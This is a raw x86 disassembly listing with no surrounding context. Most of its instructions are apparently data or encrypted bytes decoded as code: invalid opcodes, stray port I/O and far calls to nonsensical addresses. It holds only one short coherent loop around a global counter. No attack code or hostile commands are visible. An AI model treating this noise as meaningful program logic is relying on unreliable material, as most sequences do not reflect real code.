  41d784:	mov    al,0x76
  41d786:	es pop es
  41d788:	inc    esi
  41d789:	cli    
  41d78a:	and    esi,DWORD PTR [ebx]
  41d78c:	cs push edi
  41d78e:	dec    ebx
  41d78f:	jo     0x41d7dc
  41d791:	iret   
  41d792:	push   0x6d
  41d794:	sahf   
  41d795:	mov    ds:0x7d3380a3,eax
  41d79a:	pop    ebx
  41d79b:	mov    ah,0x1d
  41d79d:	ret    0xe557
  41d7a0:	nop
  41d7a1:	dec    ecx
  41d7a2:	and    edx,DWORD PTR [ebp+0x65d597e5]
  41d7a8:	cli    
  41d7a9:	xchg   ebx,eax
  41d7aa:	mov    eax,ds:0xd76492d0
  41d7af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7b1:	fnstsw WORD PTR ds:0x40a8fa53
  41d7b7:	into   
  41d7b8:	mov    ah,BYTE PTR [edi+0x12]
  41d7bb:	fsubr  DWORD PTR [ebx+0x2ea19406]
  41d7c1:	jno    0x41d797
  41d7c3:	jno    0x41d80e
  41d7c5:	outs   dx,DWORD PTR ds:[esi]
  41d7c6:	dec    esi
  41d7c7:	and    bl,BYTE PTR cs:[ecx+edi*2+0x8]
  41d7cc:	mov    dh,0xab
  41d7ce:	jecxz  0x41d82c
  41d7d0:	sub    eax,0xf7a07570
  41d7d5:	jge    0x41d7d8
  41d7d7:	nop
  41d7d8:	fadd   DWORD PTR [ebp+0x3]
  41d7db:	ins    DWORD PTR es:[edi],dx
  41d7dc:	push   edi
  41d7dd:	push   edi
  41d7de:	fadd   QWORD PTR [ebx-0x29]
  41d7e1:	jge    0x41d812
  41d7e3:	out    0x8,eax
  41d7e5:	jno    0x41d7ca
  41d7e7:	fnstenv [edx-0x6fbf4f32]
  41d7ed:	or     dl,ah
  41d7ef:	arpl   WORD PTR [esi+0x513e7d5],di
  41d7f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7f6:	mov    ch,0x27
  41d7f8:	adc    edi,DWORD PTR [esi+0x5adcf474]
  41d7fe:	pop    esp
  41d7ff:	mov    al,ds:0xd0216658
  41d804:	push   cs
  41d805:	pop    ds
  41d806:	(bad)  
  41d807:	mov    dl,0x65
  41d809:	inc    esp
  41d80a:	fnstsw WORD PTR [ebx]
  41d80c:	push   0xceca4a67
  41d811:	or     DWORD PTR [esi-0x59],0xfe16130b
  41d818:	sbb    eax,0x9d65c2c1
  41d81d:	push   eax
  41d81e:	pop    ds
  41d81f:	nop
  41d820:	sar    BYTE PTR [ecx+0x56339098],cl
  41d826:	addr16 xchg ebx,eax
  41d828:	lea    esi,ds:0xa3d41d9
  41d82e:	pop    es
  41d82f:	inc    BYTE PTR [ebx+eax*8]
  41d832:	jmp    0x41d871
  41d834:	mov    eax,ds:0x5d2d030c
  41d839:	xor    ch,BYTE PTR [ebx-0x524a9156]
  41d83f:	and    al,0x42
  41d841:	adc    eax,0x8028d5f6
  41d846:	sub    cl,0x58
  41d849:	adc    ch,BYTE PTR [eax]
  41d84b:	jbe    0x41d86a
  41d84d:	fistp  QWORD PTR [eax-0x4a]
  41d850:	scas   al,BYTE PTR es:[edi]
  41d851:	not    al
  41d853:	(bad)  
  41d854:	loope  0x41d813
  41d856:	sbb    DWORD PTR [ebx-0x6672ac5e],0xffffffac
  41d85d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d85e:	xchg   ebx,eax
  41d85f:	je     0x41d809
  41d861:	push   0xfffffffa
  41d863:	push   DWORD PTR [edi+ebx*1-0x5b9519b1]
  41d86a:	ret    
  41d86b:	(bad)  
  41d86c:	repz jmp 0x41d81e
  41d86f:	xchg   ecx,edi
  41d871:	retf   0xe48
  41d874:	leave  
  41d875:	test   BYTE PTR [ebx+0x27],bl
  41d878:	es ss in eax,0x9b
  41d87c:	mov    ah,0x5d
  41d87e:	(bad)
  41d881:	or     bh,bl
  41d883:	xlat   BYTE PTR ds:[ebx]
  41d884:	outs   dx,BYTE PTR ds:[esi]
  41d885:	mov    gs,WORD PTR [esi+0xb]
  41d888:	fwait
  41d889:	xchg   edi,eax
  41d88a:	ret    0x9c94
  41d88d:	sbb    ch,BYTE PTR [eax-0x6b]
  41d890:	outs   dx,DWORD PTR ds:[esi]
  41d891:	ja     0x41d8d3
  41d893:	es dec esp
  41d895:	and    DWORD PTR [ebp-0x30fd0afc],0x869fa0e0
  41d89f:	adc    al,0x59
  41d8a1:	(bad)  
  41d8a2:	jmp    0x4c62:0x8396e906
  41d8a9:	cmp    eax,0x2382c5c
  41d8ae:	inc    ecx
  41d8af:	mov    ah,0xae
  41d8b1:	and    dh,BYTE PTR [ecx]
  41d8b3:	scas   eax,DWORD PTR es:[edi]
  41d8b4:	test   DWORD PTR [ecx],ecx
  41d8b6:	test   DWORD PTR [edi-0x2d],ebx
  41d8b9:	sbb    al,0xce
  41d8bb:	xor    eax,0x6db3d604
  41d8c0:	lods   eax,DWORD PTR ds:[esi]
  41d8c1:	call   0x332df0b
  41d8c6:	jge    0x41d8f0
  41d8c8:	or     ecx,DWORD PTR [ecx+eax*1+0x4df3e017]
  41d8cf:	lods   al,BYTE PTR ds:[esi]
  41d8d0:	fst    st(1)
  41d8d2:	add    esp,DWORD PTR [ebp-0x563acb08]
  41d8d8:	aad    0x82
  41d8da:	sub    eax,0x35cc7aab
  41d8df:	push   ebx
  41d8e0:	retf   
  41d8e1:	push   ebp
  41d8e2:	push   ebp
  41d8e3:	lods   eax,DWORD PTR ds:[esi]
  41d8e4:	sbb    ebp,ecx
  41d8e6:	add    edx,DWORD PTR [eax]
  41d8e8:	test   DWORD PTR [ebx-0x3b203d85],esi
  41d8ee:	aaa    
  41d8ef:	dec    edi
  41d8f0:	arpl   WORD PTR [edi-0x48],di
  41d8f3:	hlt    
  41d8f4:	adc    al,0x8b
  41d8f6:	and    al,cl
  41d8f8:	mov    dl,0x84
  41d8fa:	jle    0x41d906
  41d8fc:	add    ebx,DWORD PTR [ebp+0x6]
  41d8ff:	xchg   ecx,eax
  41d900:	push   es
  41d901:	rol    edi,cl
  41d903:	ret    0x83e1
  41d906:	dec    esp
  41d907:	mov    WORD PTR [eax],cs
  41d909:	es push cs
  41d90b:	fwait
  41d90c:	jae    0x41d921
  41d90e:	je     0x41d928
  41d910:	aas    
  41d911:	or     ebp,DWORD PTR [ecx-0x5b]
  41d914:	jg     0x41d912
  41d916:	push   esi
  41d917:	jmp    0x41d954
  41d919:	add    al,0x7c
  41d91b:	xchg   ecx,eax
  41d91c:	je     0x41d95d
  41d91e:	sub    eax,0x64c9ab13
  41d923:	scas   al,BYTE PTR es:[edi]
  41d924:	mov    cl,BYTE PTR [esp+ebx*8-0x167223b5]
  41d92b:	les    esi,FWORD PTR [ebx]
  41d92d:	imul   ebp,DWORD PTR [ebx+0x76],0xffffff86
  41d931:	scas   al,BYTE PTR es:[edi]
  41d932:	pop    ss
  41d933:	mov    bh,BYTE PTR [edx+0x4770c181]
  41d939:	cmp    DWORD PTR [edx],0xffffffa2
  41d93c:	popa   
  41d93d:	mov    ch,0xe
  41d93f:	shl    BYTE PTR [eax+eiz*8-0x7f],1
  41d943:	jo     0x41d8cb
  41d945:	cld    
  41d946:	xchg   ecx,eax
  41d947:	clc    
  41d948:	jnp    0x41d9c2
  41d94a:	sbb    ah,BYTE PTR [ebp+0x3a]
  41d94d:	add    ecx,DWORD PTR [edx+ecx*4]
  41d950:	push   0xca4d9d99
  41d955:	mov    esi,0xd92dd847
  41d95a:	in     eax,0x5
  41d95c:	or     eax,0x19b1d127
  41d961:	comiss xmm4,DWORD PTR [ebp+0x4]
  41d965:	ins    BYTE PTR es:[edi],dx
  41d966:	and    eax,0x6c5cd448
  41d96b:	dec    ebp
  41d96c:	ss jnp 0x41d945
  41d96f:	xchg   edi,eax
  41d970:	je     0x41d916
  41d972:	inc    eax
  41d973:	fs jp  0x41d9c9
  41d976:	pop    es
  41d977:	pop    edx
  41d978:	push   ds
  41d979:	pushf  
  41d97a:	call   0xf1c5:0x2e0304c8
  41d981:	adc    dh,0x43
  41d984:	jb     0x41d9b8
  41d986:	add    DWORD PTR [edi+0x260a20f3],esp
  41d98c:	jns    0x41d974
  41d98e:	adc    ebp,esp
  41d990:	in     eax,dx
  41d991:	in     al,0xe6
  41d993:	push   edx
  41d994:	(bad)
  41d999:	das    
  41d99a:	pusha  
  41d99b:	int3   
  41d99c:	call   0xa8f3:0x8b672d7d
  41d9a3:	aas    
  41d9a4:	pop    edi
  41d9a5:	outs   dx,DWORD PTR ds:[esi]
  41d9a6:	mov    ds:0x94fd7c4a,al
  41d9ab:	push   esp
  41d9ac:	jge    0x41d9c3
  41d9ae:	(bad)  
  41d9b0:	sbb    BYTE PTR [ebp-0x35],ah
  41d9b3:	mov    ds:0x1f2b72fa,eax
  41d9b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9b9:	sub    DWORD PTR [esi+0x32dd82fd],ebp
  41d9bf:	lds    eax,FWORD PTR [edx]
  41d9c1:	retf   
  41d9c2:	ret    
  41d9c3:	ss jns 0x41d985
  41d9c6:	mov    al,ds:0xbbbf3463
  41d9cb:	push   esi
  41d9cc:	repnz scas al,BYTE PTR es:[edi]
  41d9ce:	fstp   DWORD PTR [ebp-0x10]
  41d9d1:	daa    
  41d9d2:	test   eax,0xbe1058a3
  41d9d7:	xchg   ebp,eax
  41d9d8:	dec    esi
  41d9d9:	cmp    ah,dh
  41d9db:	add    BYTE PTR [eax-0x6706300],bh
  41d9e1:	nop
  41d9e2:	popa   
  41d9e3:	jge    0x41da5a
  41d9e5:	jl     0x41d980
  41d9e7:	inc    ebp
  41d9e8:	push   0x1f
  41d9ea:	ret    0xee0f
  41d9ed:	push   es
  41d9ee:	pop    ebx
  41d9ef:	sub    al,0xf1
  41d9f1:	mov    dl,0x43
  41d9f3:	fs je  0x41da48
  41d9f6:	push   cs
  41d9f7:	cs pop esi
  41d9f9:	je     0x41d9cd
  41d9fb:	out    0xee,al
  41d9fd:	stos   BYTE PTR es:[edi],al
  41d9fe:	out    0x3c,al
  41da00:	jg     0x41da52
  41da02:	mov    ebp,0x1585ea57
  41da07:	(bad)  
  41da08:	sahf   
  41da09:	mov    esp,0xc8da4447
  41da0e:	cdq    
  41da0f:	pop    eax
  41da10:	mov    esp,0x12796677
  41da15:	mov    ebx,ebp
  41da17:	loopne 0x41d9e7
  41da19:	shr    DWORD PTR [edx],cl
  41da1b:	mov    dl,BYTE PTR ds:[ecx-0x6f]
  41da1f:	lea    eax,[edx+edi*1+0x518d9354]
  41da26:	push   ecx
  41da27:	jbe    0x41da43
  41da29:	sahf   
  41da2a:	mov    ah,0x52
  41da2c:	(bad)  
  41da2d:	pusha  
  41da2e:	mov    ds:0x83d70b85,al
  41da33:	jbe    0x41da02
  41da35:	js     0x41da44
  41da37:	push   esp
  41da38:	rcr    ebp,1
  41da3a:	add    ah,BYTE PTR [edx]
  41da3c:	xchg   ebp,eax
  41da3d:	xor    BYTE PTR [ebp+0x290454bb],bh
  41da43:	cmc    
  41da44:	call   0x3814ff7b
  41da49:	pushf  
  41da4a:	stc    
  41da4b:	fcom   DWORD PTR [ebp-0x35]
  41da4e:	fiadd  WORD PTR [edi-0x236aaf21]
  41da54:	cmp    al,BYTE PTR [eax+0x2a]
  41da57:	add    DWORD PTR [eax-0x1e],edi
  41da5a:	inc    ebp
  41da5b:	xchg   edi,eax
  41da5c:	cld    
  41da5d:	fld    DWORD PTR [ecx-0x2cdcf48c]
  41da63:	in     al,dx
  41da64:	mov    WORD PTR [edx-0x7ad2966b],fs
  41da6a:	icebp  
  41da6b:	cli    
  41da6c:	popf   
  41da6d:	scas   eax,DWORD PTR es:[edi]
  41da6e:	inc    edx
  41da6f:	stc    
  41da70:	xchg   BYTE PTR [ebx-0x17487cba],ch
  41da76:	call   0xed2ad693
  41da7b:	lods   eax,DWORD PTR ds:[esi]
  41da7c:	add    esp,ecx
  41da7e:	in     al,dx
  41da7f:	sahf   
  41da80:	loopne 0x41dabe
  41da82:	dec    esp
  41da83:	mov    ds:0x849f1118,al
  41da88:	push   es
  41da89:	nop
  41da8a:	xor    al,0x5e
  41da8c:	sbb    BYTE PTR ds:0xe6528f7a,0xcd
  41da93:	(bad)
  41da96:	vpackssdw ymm3,ymm3,ymm5
  41da9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da9b:	add    BYTE PTR [eax],al
  41da9d:	(bad)  
  41da9e:	pop    ecx
  41da9f:	in     al,dx
  41daa0:	loopne 0x41da84
  41daa2:	es out 0x68,eax
  41daa5:	pop    esp
  41daa6:	inc    ecx
  41daa7:	dec    edx
  41daa8:	rol    DWORD PTR [esi],cl
  41daaa:	sub    al,0x4f
  41daac:	or     dl,BYTE PTR [ecx-0xaadc863]
  41dab2:	xchg   ecx,eax
  41dab3:	adc    ebp,DWORD PTR [ecx]
  41dab5:	sbb    edi,DWORD PTR [edx+edx*1]
  41dab8:	repnz int 0x6d
  41dabb:	dec    esi
  41dabc:	inc    ebp
  41dabd:	push   ecx
  41dabf:	sub    DWORD PTR [esi-0x72e066dd],0x601f6bf5
  41dac9:	dec    eax
  41daca:	dec    edi
  41dacb:	mov    ebx,0x1c6900ed
  41dad0:	mov    esp,0x9035bded
  41dad5:	jmp    0x198b964b
  41dada:	in     eax,dx
  41dadb:	mov    edx,ds
  41dadd:	xchg   ebp,eax
  41dade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dadf:	arpl   si,cx
  41dae1:	xor    al,BYTE PTR [edi]
  41dae3:	jb     0x41dade
  41dae5:	fs shl BYTE PTR ds:[ecx],cl
  41dae9:	in     al,dx
  41daea:	popa   
  41daeb:	loopne 0x41dae6
  41daed:	ficomp DWORD PTR [ebx+0x72b255f8]
  41daf3:	rol    BYTE PTR [ebx],1
  41daf5:	or     DWORD PTR [edi+0x163dcee8],ecx
  41dafb:	out    dx,eax
  41dafc:	je     0x41db4b
  41dafe:	and    ah,bl
  41db00:	adc    BYTE PTR [eax-0x24165bf9],al
  41db06:	mov    ds:0x874a08c0,al
  41db0b:	xchg   edx,eax
  41db0c:	push   0x33
  41db0e:	add    al,0x6b
  41db10:	xor    BYTE PTR [edx],cl
  41db12:	xor    eax,0xba8e2f44
  41db17:	(bad)  
  41db18:	lock ss jne 0x41db62
  41db1c:	call   DWORD PTR ds:0xabb37c26
  41db22:	test   DWORD PTR ds:0xb6f9eb92,0x30e70fc4
  41db2c:	repz dec esi
  41db2e:	es xchg ecx,eax
  41db30:	(bad)  
  41db31:	jno    0x41daf8
  41db33:	loope  0x41dbaa
  41db35:	ins    BYTE PTR es:[edi],dx
  41db36:	loope  0x41dabb
  41db38:	outs   dx,BYTE PTR ds:[esi]
  41db39:	xchg   ecx,eax
  41db3a:	mov    dh,0xaa
  41db3c:	mov    esp,0xacee633c
  41db41:	(bad)  
  41db42:	pushf  
  41db43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db45:	mov    ah,0x66
  41db47:	inc    esi
  41db48:	xchg   BYTE PTR [edi-0xb],cl
  41db4b:	ds iret 
  41db4d:	xchg   ebp,eax
  41db4e:	sub    al,0x4f
  41db50:	mov    bh,0xdf
  41db52:	test   al,0x7
  41db54:	rol    dh,cl
  41db56:	inc    edx
  41db57:	fistp  QWORD PTR [ecx-0x75]
  41db5a:	ffreep st(1)
  41db5c:	in     al,0x34
  41db5e:	outs   dx,BYTE PTR ds:[esi]
  41db5f:	add    al,0x42
  41db61:	mov    bh,0x24
  41db63:	xor    ch,al
  41db65:	int    0x46
  41db67:	(bad)  
  41db68:	mov    ebp,0x7ceb2258
  41db6d:	push   edx
  41db6e:	hlt    
  41db6f:	sub    ch,ah
  41db71:	adc    dl,BYTE PTR [edi-0x64]
  41db74:	mov    eax,ds:0x8ea1fef2
  41db79:	ror    DWORD PTR [esi+0x77],cl
  41db7c:	inc    ecx
  41db7d:	add    al,0xab
  41db7f:	(bad)  
  41db80:	stc    
  41db81:	mov    ch,0xd6
  41db83:	ins    BYTE PTR es:[edi],dx
  41db84:	inc    esi
  41db85:	xor    DWORD PTR [ebp-0x6b],edi
  41db88:	stc    
  41db89:	daa    
  41db8a:	inc    eax
  41db8b:	hlt    
  41db8c:	ret    
  41db8d:	and    esi,DWORD PTR [eax+0x3304a464]
  41db93:	mov    cs,WORD PTR [ebp-0x75]
  41db96:	shrd   DWORD PTR [edi],edx,0xf2
  41db9a:	jecxz  0x41dbf6
  41db9c:	xchg   ebx,eax
  41db9d:	nop
  41db9e:	dec    esi
  41db9f:	add    eax,0x1858fe19
  41dba4:	mov    ebx,esi
  41dba6:	pop    edx
  41dba7:	test   eax,0xcd1e648c
  41dbac:	sub    al,0xfb
  41dbae:	xlat   BYTE PTR ds:[ebx]
  41dbaf:	sub    eax,0x6483064d
  41dbb4:	jmp    0x41dc26
  41dbb6:	mov    esi,0x4eaddfaf
  41dbbb:	enter  0xb5ee,0xc1
  41dbbf:	fdiv   QWORD PTR [ecx+0x3a4d765d]
  41dbc5:	add    eax,0xe49f1e6f
  41dbca:	and    edx,DWORD PTR [edx+ecx*4]
  41dbcd:	jle    0x41dba9
  41dbcf:	test   eax,0xd9b374dd
  41dbd4:	inc    edx
  41dbd5:	repz jle 0x41db6d
  41dbd8:	add    esp,DWORD PTR [ebx-0x21]
  41dbdb:	push   eax
  41dbdc:	jae    0x41dc1f
  41dbde:	mov    ecx,DWORD PTR [ebp-0x2db94d6a]
  41dbe4:	and    ebp,DWORD PTR [edx+0x28]
  41dbe7:	dec    edx
  41dbe8:	jp     0x41dbfa
  41dbea:	mov    edx,0x13ebf0c0
  41dbef:	mov    esi,0x8bf04589
  41dbf4:	or     eax,0x42b1de
  41dbf9:	and    DWORD PTR ds:0x42b212,ecx
  41dbff:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  41dc06:	mov    eax,DWORD PTR [ebp-0x18]
  41dc09:	mov    DWORD PTR ds:0x42b19a,0x12
  41dc13:	cmp    DWORD PTR ds:0x42b19a,0x0
  41dc1a:	je     0x41fffa
  41dc20:	cmp    DWORD PTR ds:0x42b19a,0x4
  41dc27:	jle    0x41fffa
  41dc2d:	jmp    0x41dc3b
  41dc32:	push   DWORD PTR [ebp-0x18]
  41dc35:	call   DWORD PTR ds:0x42b2f2
  41dc3b:	cmp    DWORD PTR ds:0x42b19a,0x5
  41dc42:	jne    0x41dc57
  41dc48:	xor    ecx,ecx
  41dc4a:	add    ecx,DWORD PTR ds:0x42b19a
  41dc50:	dec    ecx
  41dc51:	mov    DWORD PTR ds:0x42b19a,ecx
  41dc57:	mov    ecx,DWORD PTR ds:0x42b19a
  41dc5d:	dec    ecx
  41dc5e:	mov    DWORD PTR ds:0x42b19a,ecx
  41dc64:	jmp    0x41dc13
  41dc69:	jmp    0x41fffa
  41dc6e:	push   cs
  41dc6f:	mov    BYTE PTR [edi-0x79d57893],0x82
  41dc76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc77:	mov    dl,0xfb
  41dc79:	mov    eax,cs:0x7a576fee
  41dc7f:	fild   DWORD PTR [eax-0x7ca1f07d]
  41dc85:	and    DWORD PTR [esi-0x22106fa7],0xfffffff7
  41dc8c:	adc    eax,0x12bb404e
  41dc91:	imul   edi,eax,0x3f3e7841
  41dc97:	add    al,0x3a
  41dc99:	rcr    BYTE PTR [ebx-0x4f],cl
  41dc9c:	bound  ecx,QWORD PTR [ebx+0x7]
  41dc9f:	inc    ebp
  41dca0:	inc    edx
  41dca1:	mov    WORD PTR [edx+0x1dd9d914],ds
  41dca7:	bound  eax,QWORD PTR [edi+0x13]
  41dcaa:	pop    ebx
  41dcab:	inc    ebx
  41dcac:	stos   BYTE PTR es:[edi],al
  41dcad:	inc    ecx
  41dcae:	jns    0x41dc9a
  41dcb0:	cs clc 
  41dcb2:	pop    ebp
  41dcb3:	and    DWORD PTR [eax],0x6d
  41dcb6:	mov    ds:0x848e3157,al
  41dcbb:	(bad)  
  41dcbc:	mov    al,0x16
  41dcbe:	jg     0x41dd0f
  41dcc0:	pop    edx
  41dcc1:	dec    esp
  41dcc2:	xor    BYTE PTR [edi-0x7e],bl
  41dcc5:	or     DWORD PTR [edi+edx*1-0x13d37fab],edi
  41dccc:	sub    DWORD PTR [eax-0x58],ecx
  41dccf:	in     eax,0xeb
  41dcd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcd2:	push   esi
  41dcd3:	dec    eax
  41dcd4:	add    BYTE PTR [edi-0x502669e2],ah
  41dcda:	out    dx,eax
  41dcdb:	not    BYTE PTR [edi-0x6cc428fd]
  41dce1:	cdq    
  41dce2:	pop    ecx
  41dce3:	sbb    al,0x68
  41dce5:	ds leave 
  41dce7:	and    al,0x64
  41dce9:	imul   eax,DWORD PTR [ebx-0x41],0xae2f0138
  41dcf0:	mov    bl,0x9b
  41dcf2:	inc    esp
  41dcf3:	xchg   edi,eax
  41dcf4:	(bad)  
  41dcf5:	sbb    ch,BYTE PTR [ebp-0x2a]
  41dcf8:	sub    edx,DWORD PTR [edi+0x2e]
  41dcfb:	ret    
  41dcfc:	enter  0xeb39,0xf0
  41dd00:	jle    0x41dd30
  41dd02:	cmc    
  41dd03:	outs   dx,BYTE PTR ds:[esi]
  41dd04:	hlt    
  41dd05:	cmp    dh,BYTE PTR [edx]
  41dd07:	pop    eax
  41dd08:	inc    esp
  41dd09:	mov    edi,0xbe134fd4
  41dd0e:	mov    BYTE PTR [esi+0x798a4cd1],ah
  41dd14:	push   eax
  41dd15:	jl     0x41dce7
  41dd17:	xchg   edx,esp
  41dd19:	repnz sub ebp,DWORD PTR [eax]
  41dd1c:	mov    gs,WORD PTR [ebp+0x396380e3]
  41dd22:	cmp    ecx,ebx
  41dd24:	and    eax,0xa4390443
  41dd29:	xchg   esp,eax
  41dd2a:	test   ebp,eax
  41dd2c:	xchg   esp,eax
  41dd2d:	call   0xbe59:0xd9b7c6db
  41dd34:	jns    0x41dcec
  41dd36:	or     ch,ch
  41dd38:	cmc    
  41dd39:	outs   dx,DWORD PTR ds:[esi]
  41dd3a:	call   0x453f:0x452114
  41dd41:	jmp    0x41dcfa
  41dd43:	jle    0x41dcee
  41dd45:	or     edi,ecx
  41dd47:	leave  
  41dd48:	int3   
  41dd49:	ins    DWORD PTR es:[edi],dx
  41dd4a:	outs   dx,BYTE PTR ds:[esi]
  41dd4b:	enter  0x155c,0xa4
  41dd4f:	sbb    DWORD PTR [ebx],0x6bfdc126
  41dd55:	jge    0x41dd18
  41dd57:	ins    BYTE PTR es:[edi],dx
  41dd58:	int    0xf
  41dd5a:	mov    ah,0x66
  41dd5c:	push   edi
  41dd5d:	mov    al,0xe4
  41dd5f:	mov    ds:0x3a226e57,al
  41dd64:	scas   eax,DWORD PTR es:[edi]
  41dd65:	xchg   edx,eax
  41dd66:	pop    DWORD PTR [edi-0x11ca2608]
  41dd6c:	xchg   edi,eax
  41dd6d:	push   0x54
  41dd6f:	push   ss
  41dd70:	test   BYTE PTR [edx],bl
  41dd72:	cmp    al,0x95
  41dd74:	popf   
  41dd75:	pop    edx
  41dd76:	sti    
  41dd77:	dec    esi
  41dd78:	lds    esi,FWORD PTR [edx]
  41dd7a:	arpl   bp,bx
  41dd7c:	nop
  41dd7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd7e:	inc    ebx
  41dd7f:	pop    ss
  41dd80:	mov    ecx,0x98e3f5fe
  41dd85:	ror    BYTE PTR [esi-0x46aa4c3b],1
  41dd8b:	jne    0x41dd5e
  41dd8d:	mov    eax,ds:0x69871402
  41dd92:	mov    BYTE PTR [esi-0x74d32f0c],bh
  41dd98:	or     bl,BYTE PTR [esi+0x661af256]
  41dd9e:	cmp    cl,BYTE PTR [ecx+0x26]
  41dda1:	dec    edi
  41dda2:	lahf   
  41dda3:	adc    BYTE PTR [ebp*8+0x3a43e014],cl
  41ddaa:	mov    edi,0x5c4f20dd
  41ddaf:	mov    ecx,0xf7cf9b6b
  41ddb4:	sub    esp,0xd58e966
  41ddba:	jbe    0x41dde1
  41ddbc:	dec    edi
  41ddbd:	les    eax,FWORD PTR [ebp+0x7c138f08]
  41ddc3:	pop    esp
  41ddc4:	mov    DWORD PTR [edi],ebp
  41ddc6:	out    0x88,al
  41ddc8:	sbb    bl,BYTE PTR [eax-0x7a]
  41ddcb:	add    al,0x73
  41ddcd:	xor    ecx,DWORD PTR [edi+0x225b49c]
  41ddd3:	outs   dx,BYTE PTR ds:[esi]
  41ddd4:	pop    esi
  41ddd5:	add    cl,al
  41ddd7:	aad    0x5c
  41ddd9:	mov    dl,0x44
  41dddb:	retf   0x1209
  41ddde:	mov    WORD PTR [eax],?
  41dde0:	lahf   
  41dde1:	arpl   WORD PTR [ecx+0x70e9827e],bp
  41dde7:	jmp    0x46f5e1a7
  41ddec:	lods   eax,DWORD PTR ds:[esi]
  41dded:	pop    edi
  41ddee:	aas    
  41ddef:	fst    st(0)
  41ddf1:	scas   al,BYTE PTR es:[edi]
  41ddf2:	test   BYTE PTR [esi+0x7a19a4f3],0x5d
  41ddf9:	ficom  DWORD PTR [ebx+0x30]
  41ddfc:	mov    ebp,0xaa774245
  41de01:	adc    DWORD PTR [eax+0x5d],esi
  41de04:	ins    BYTE PTR es:[edi],dx
  41de05:	inc    ebp
  41de06:	out    dx,eax
  41de07:	sbb    DWORD PTR [ebx-0x63eb1f19],eax
  41de0d:	ins    BYTE PTR es:[edi],dx
  41de0e:	fld    DWORD PTR [edx+0x36]
  41de11:	inc    ebp
  41de12:	push   eax
  41de13:	and    al,0xcb
  41de15:	xchg   esi,eax
  41de16:	sub    eax,0xb0587a6f
  41de1b:	call   0xd9241fa6
  41de20:	cmp    bh,cl
  41de22:	aaa    
  41de23:	dec    BYTE PTR [edx]
  41de25:	test   DWORD PTR [edx],edi
  41de27:	fwait
  41de28:	sti    
  41de29:	pusha  
  41de2a:	or     DWORD PTR [edx+0x5076aa98],ebx
  41de30:	lods   eax,DWORD PTR ds:[esi]
  41de31:	mov    BYTE PTR [esi-0x55fdf2fa],dl
  41de37:	in     eax,0xdb
  41de39:	fldenv [esi+0x49]
  41de3c:	adc    eax,edx
  41de3e:	lds    edx,FWORD PTR [ebp+0x1dce18da]
  41de44:	test   BYTE PTR [eax+esi*2+0x604b1586],ah
  41de4b:	outs   dx,BYTE PTR ds:[esi]
  41de4c:	and    DWORD PTR ds:0x6edf6a12,esp
  41de52:	and    ebx,ebx
  41de54:	(bad)  
  41de56:	or     al,0x39
  41de58:	jle    0x41de6a
  41de5a:	cmp    ch,BYTE PTR [ebp+0x106e9dc]
  41de60:	cmp    dh,BYTE PTR [esp+ebp*1+0x5f2a9a16]
  41de67:	push   0xffffffcd
  41de69:	fld    QWORD PTR [ebx]
  41de6b:	aaa    
  41de6c:	sbb    BYTE PTR [ebx+0x18b2c083],bh
  41de72:	fwait
  41de73:	or     al,0x58
  41de75:	mov    BYTE PTR ss:[esi-0x70],ah
  41de79:	mov    bl,0xe5
  41de7b:	js     0x41ded4
  41de7d:	rcl    BYTE PTR [edx+0x49],1
  41de80:	ins    BYTE PTR es:[edi],dx
  41de81:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41de83:	fnstsw WORD PTR [ecx-0x20a6a606]
  41de89:	and    eax,0x14575c6f
  41de8e:	inc    eax
  41de8f:	test   eax,edx
  41de91:	add    eax,0x6a144979
  41de96:	adc    dh,BYTE PTR [esi+0x58]
  41de99:	jb     0x41de3c
  41de9b:	fwait
  41de9c:	adc    eax,0x436f6b2d
  41dea1:	and    dl,BYTE PTR [eax+0x77]
  41dea4:	ficom  WORD PTR ds:0x64cd19da
  41deaa:	sbb    al,0x62
  41deac:	jmp    0x6e9f21f
  41deb1:	fxam   
  41deb3:	call   0xb9c9dbee
  41deb8:	mov    ecx,0x3a07fdd
  41debd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41debe:	adc    eax,0x52859fc9
  41dec3:	cmp    al,bl
  41dec5:	je     0x41deff
  41dec7:	jmp    0x41de83
  41dec9:	ins    DWORD PTR es:[edi],dx
  41deca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41decb:	lods   eax,DWORD PTR ds:[esi]
  41decc:	(bad)  
  41decd:	jae    0x41def1
  41decf:	cmp    cl,BYTE PTR [ecx]
  41ded1:	stc    
  41ded2:	ins    BYTE PTR es:[edi],dx
  41ded3:	push   ebx
  41ded4:	repz mov al,BYTE PTR [edx]
  41ded7:	stos   DWORD PTR es:[edi],eax
  41ded8:	(bad)  
  41ded9:	mov    al,ds:0xcf8771c2
  41dede:	lods   eax,DWORD PTR ds:[esi]
  41dedf:	in     al,dx
  41dee0:	push   cs
  41dee1:	and    DWORD PTR [eax+0x54f5b95c],eax
  41dee7:	mov    dl,0x59
  41dee9:	iret   
  41deea:	(bad)  
  41deeb:	cdq    
  41deec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41deed:	jp     0x41df55
  41deef:	fimul  WORD PTR [edx+0x26]
  41def2:	jmp    0x3a1ef5b
  41def7:	adc    al,0x3a
  41def9:	xor    BYTE PTR [ebp-0x4],0x68
  41defd:	ret    0x32b7
  41df00:	lea    eax,[edx+edi*4+0x47]
  41df04:	jnp    0x41df79
  41df06:	mov    bh,BYTE PTR [edx-0x1ffb13b4]
  41df0c:	push   edx
  41df0d:	inc    BYTE PTR [edx-0x77fb5396]
  41df13:	aaa    
  41df14:	or     BYTE PTR [esi-0x6974a3ff],ch
  41df1a:	jno    0x41df7e
